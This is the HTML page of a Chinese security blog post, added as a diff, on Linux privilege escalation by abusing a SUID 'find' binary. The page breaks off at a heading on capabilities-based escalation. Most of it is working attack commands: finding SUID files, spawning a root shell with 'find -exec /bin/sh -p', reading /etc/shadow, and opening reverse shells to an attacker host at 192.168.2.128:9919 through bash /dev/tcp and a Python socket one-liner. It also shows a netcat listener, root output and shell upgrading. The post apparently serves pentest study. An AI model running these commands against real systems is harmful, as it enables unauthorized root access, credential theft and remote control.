@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>权限提升 - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='攻防, 提权' />
+  <meta itemprop="name" content="权限提升">
+  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="wordCount" content="709">
+  <meta itemprop="keywords" content="攻防,提权"><meta property="og:url" content="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/48/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="权限提升">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:tag" content="攻防">
+    <meta property="article:tag" content="提权">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="权限提升">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/48/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/linux/50/" /><link rel="next" href="https://dongyu29.github.io/posts/owasp/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/110/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "权限提升",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/%E6%8F%90%E6%9D%83\/48\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 提权","wordcount":  709 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/%E6%8F%90%E6%9D%83\/48\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">权限提升</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>权限提升</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="709 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 800 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>4 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="find提权" class="heading-element"><span>0.0.0.1  find提权</span>
+  <a href="#find%e6%8f%90%e6%9d%83" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><blockquote>
+<p>普通用户find命令提权</p>
+<p>先查看find命令有没有提权的可能</p>
+</blockquote>
+<h6 id="姿势" class="heading-element"><span>0.0.0.1.1  姿势</span>
+  <a href="#%e5%a7%bf%e5%8a%bf" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>姿势一</p>
+<pre tabindex="0"><code>find / -perm -g=s -type f 2&gt;/dev/null
+find . -exec /bin/sh -p \; -quit</code></pre><p>姿势二</p>
+<pre tabindex="0"><code>touch getshell
+find / -type f -name getshell -exec &#34;whoami&#34; \;
+find / -type f -name getshell -exec &#34;/bin/sh&#34; \;</code></pre><p>姿势三</p>
+<pre tabindex="0"><code>find / -user root -perm -4000 -print 2&gt;/dev/null
+find / -perm -u=s -type f 2&gt;/dev/null
+find / -user root -perm -4000 -exec ls -ldb {} ;
+如果有find执行
+touch test
+find . -exec /bin/sh -p \; -quit
+这时候，你就拥有了root权限的一个shell。</code></pre><h6 id="1-查看find命令权限" class="heading-element"><span>0.0.0.1.2  1. 查看find命令权限</span>
+  <a href="#1-%e6%9f%a5%e7%9c%8bfind%e5%91%bd%e4%bb%a4%e6%9d%83%e9%99%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### 方法 一、</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### 1. 查看find命令位置</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">which</span> <span style="color:#58a1dd">find</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### 2. 查看 find 命令权限</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ls </span><span style="color:#58a1dd">-l</span>  /<span style="color:#58a1dd">usr</span>/<span style="color:#58a1dd">bin</span>/<span style="color:#58a1dd">find</span>   <span style="color:#828b96;font-style:italic">#  这是find 默认位置</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">-rwsr-xr-x</span>. <span style="color:#a6be9d">1</span> <span style="color:#58a1dd">root</span> <span style="color:#58a1dd">root</span> <span style="color:#a6be9d">199200</span> <span style="color:#58a1dd">Nov</span> <span style="color:#a6be9d">20</span>  <span style="color:#a6be9d">2015</span> /<span style="color:#58a1dd">usr</span>/<span style="color:#58a1dd">bin</span>/<span style="color:#58a1dd">find</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### 有s 表示可以提权</span></span></span></code></pre></div><p>####### 方法 二、</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### 用find 命令查找 有超级属性的文件</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">find</span> / <span style="color:#58a1dd">-perm</span> <span style="color:#58a1dd">-u</span>=<span style="color:#58a1dd">s</span> <span style="color:#58a1dd">-type</span> <span style="color:#58a1dd">f</span> <span style="color:#a6be9d">2</span>&gt;/<span style="color:#58a1dd">dev</span>/<span style="color:#58a1dd">null</span></span></span></code></pre></div><h6 id="2假如find命令可提权-有s权限位" class="heading-element"><span>0.0.0.1.3  2.假如find命令可提权 有s权限位</span>
+  <a href="#2%e5%81%87%e5%a6%82find%e5%91%bd%e4%bb%a4%e5%8f%af%e6%8f%90%e6%9d%83-%e6%9c%89s%e6%9d%83%e9%99%90%e4%bd%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><blockquote>
+<p>权限位 u + s</p>
+<p>权限为 4xxx</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### 查看是否可以用root 命令执行命令</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">find</span> `<span style="color:#58a1dd">which</span> <span style="color:#58a1dd">find</span>` <span style="color:#58a1dd">-exec</span> <span style="color:#58a1dd">whoami</span> \;
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### 命令解释： 以find 命令 执行  whoami 命令。   </span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### find  (一个路径或文件必须存在)  -exec  执行命令 （结束）\;</span></span></span></code></pre></div><blockquote>
+<p>可以直接执行命令</p>
+<p><code>find /usr/bin/find -exec cat /etc/shadow \;</code></p>
+<p>find `which find` -exec cat /etc/shadow ;</p>
+<p>查看普通用户没有权限查看的文件。</p>
+</blockquote>
+<h6 id="3-反弹shell" class="heading-element"><span>0.0.0.1.4  3. 反弹shell</span>
+  <a href="#3-%e5%8f%8d%e5%bc%b9shell" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><blockquote>
+<p>常规套路 ，2个机器。 一个开监听，一个执行反弹命令</p>
+<table>
+<thead>
+<tr>
+<th>用途</th>
+<th>ip</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>攻击机（root 用户）</td>
+<td>192.168.2.128</td>
+<td>开监听</td>
+</tr>
+<tr>
+<td>靶机（普通用户）</td>
+<td>192.168.2.10</td>
+<td>执行反弹shell 命令</td>
+</tr>
+</tbody>
+</table>
+<h5 id="31-开监听" class="heading-element"><span>0.0.0.2  3.1 开监听</span>
+  <a href="#31-%e5%bc%80%e7%9b%91%e5%90%ac" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 监听 9919 端口</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">nc</span> <span style="color:#58a1dd">-lvvnp</span>  <span style="color:#a6be9d">9919</span></span></span></code></pre></div><h5 id="32-执行反弹shell-命令" class="heading-element"><span>0.0.0.3  3.2 执行反弹shell 命令</span>
+  <a href="#32-%e6%89%a7%e8%a1%8c%e5%8f%8d%e5%bc%b9shell-%e5%91%bd%e4%bb%a4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 用find 命令执行</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">find</span> /<span style="color:#58a1dd">etc</span>/<span style="color:#58a1dd">passwd</span> <span style="color:#58a1dd">-exec</span> <span style="color:#58a1dd">bash</span> <span style="color:#58a1dd">-ip</span> &gt;&amp; /<span style="color:#58a1dd">dev</span>/<span style="color:#58a1dd">tcp</span>/<span style="color:#a6be9d">192.168</span>.<span style="color:#58a1dd">2</span>.<span style="color:#a6be9d">128</span>/<span style="color:#a6be9d">9919</span> <span style="color:#a6be9d">0</span>&gt;&amp;<span style="color:#a6be9d">1</span> \;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># python 方式反弹</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">find</span> /<span style="color:#58a1dd">etc</span>/<span style="color:#58a1dd">passwd</span> <span style="color:#58a1dd">-exec</span> <span style="color:#58a1dd">python</span> <span style="color:#58a1dd">-c</span> <span style="color:#a6be9d">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.2.128&#34;,9919));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-ip&#34;]);&#39;</span> \;</span></span></code></pre></div><blockquote>
+<p><strong>-p : 让 euid 为0 ， 权限为root 权限</strong></p>
+<p>默认情况下 bash 在执行时，如果发现 euid 和 uid 不匹配，会将 euid（即 suid） 强制重置为uid 。如果使用了 -p 参数，则不会再覆盖。</p>
+</blockquote>
+<h5 id="33-验证" class="heading-element"><span>0.0.0.4  3.3 验证</span>
+  <a href="#33-%e9%aa%8c%e8%af%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 在反弹的shell 中 执行命令</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">bash</span>-<span style="color:#a6be9d">4.2</span><span style="color:#828b96;font-style:italic"># whoami</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">whoami</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">root</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">bash</span>-<span style="color:#a6be9d">4.2</span><span style="color:#828b96;font-style:italic"># id</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">id</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">uid</span>=<span style="color:#a6be9d">1005</span>(<span style="color:#58a1dd">zzzz</span>) <span style="color:#58a1dd">gid</span>=<span style="color:#a6be9d">1005</span>(<span style="color:#58a1dd">zzzz</span>) <span style="color:#58a1dd">euid</span>=<span style="color:#a6be9d">0</span>(<span style="color:#58a1dd">root</span>) <span style="color:#58a1dd">groups</span>=<span style="color:#a6be9d">1005</span>(<span style="color:#58a1dd">zzzz</span>)</span></span></code></pre></div><blockquote>
+<p>此shell 为不完整的shell， 升级交互式。</p>
+<p>3.4 升级交互式shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 在反弹shell 上执行</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[<span style="color:#58a1dd">root</span><span style="color:#58a1dd">@localhost</span> ~]<span style="color:#828b96;font-style:italic"># python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;   </span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#使用python，升级交互shell</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[<span style="color:#58a1dd">root</span><span style="color:#58a1dd">@localhost</span> ~]<span style="color:#828b96;font-style:italic"># ^Z		     </span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># ctrl + z 按键  挂起正在运行的程序 </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">root</span><span style="color:#58a1dd">@kali64</span>:~<span style="color:#828b96;font-style:italic"># stty raw -echo	      </span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 输入这句后 在输入命令终端不在显示 </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">root</span><span style="color:#58a1dd">@kali64</span>:~<span style="color:#828b96;font-style:italic"># fg		      </span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 把后台挂起的程序，放到控制台----》 终端不显示命令，输入后回车</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[<span style="color:#58a1dd">root</span><span style="color:#58a1dd">@localhost</span> ~]<span style="color:#828b96;font-style:italic"># reset</span></span></span></code></pre></div></blockquote>
+</blockquote>
+<h5 id="capabilities提权" class="heading-element"><span>0.0.0.5  capabilities提权</span>
+  <a href="#capabilities%e6%8f%90%e6%9d%83" class="heading-mark">
